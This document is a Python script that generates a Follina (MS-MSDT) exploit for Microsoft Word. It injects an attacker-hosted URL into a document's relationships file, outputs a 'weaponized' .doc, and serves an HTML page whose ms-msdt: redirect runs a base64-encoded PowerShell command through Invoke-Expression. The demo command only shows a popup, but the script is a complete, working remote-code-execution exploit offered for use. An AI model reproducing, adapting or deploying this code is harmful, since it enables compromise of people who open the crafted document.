import zipfile
import shutil
import os
import netifaces
import ipaddress
import random
import base64
import http.server
import socketserver
import string
import socket
import tempfile



def main():
    try:

        user_interface = "wlp3s0"              

        print(user_interface)

        addrs = netifaces.ifaddresses(user_interface)
        local_ip_addr = addrs[netifaces.AF_INET][0]["addr"]
    except ValueError:
        print("Error")



    

    doc_folder = "doc"

    temp_staging_dir = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))

    temp_doc_path = os.path.join(temp_staging_dir, doc_folder)

    shutil.copytree(doc_folder, os.path.join(temp_staging_dir, temp_doc_path))
        
    print(f"[+] FILES COPIED {temp_staging_dir}")

    

    #make temp server location

    server_path = os.path.join(temp_staging_dir, "www")
    os.makedirs(server_path)



    #modifying the word document skeleton to include our http server
    document_rels_path = os.path.join(temp_staging_dir, doc_folder, "word", "_rels", "document.xml.rels")


    with open(document_rels_path) as inject_http_server:
        external_http_referral = inject_http_server.read()

    external_http_referral = external_http_referral.replace("{staged_html}", f"http://{local_ip_addr}:8000/index.html")

    with open(document_rels_path, "w") as inject_http_server:
        inject_http_server.write(external_http_referral)




    #rebuild the document file
    shutil.make_archive("./follina.doc", "zip", temp_doc_path)
    os.rename("./follina.doc" + ".zip", "./another3.doc")

    print("[+] Document Weaponized!!!")

    
    
    
    #encoding command to base64

    command = "msg %USERNAME% pwnd!!!"

    base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")

    # Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
    html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
    html_payload += (
        "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
        + "\n</script>"
    )
    

    #creating html endpoint

    with open(os.path.join(server_path, "index.html"), "w") as html_enpoint:
        html_enpoint.write(html_payload)

    PORT = 8000

    DIRECTORY = server_path



    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=DIRECTORY, **kwargs)


    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print("serving at port", PORT)
        httpd.serve_forever()






if __name__ == "__main__":
    main()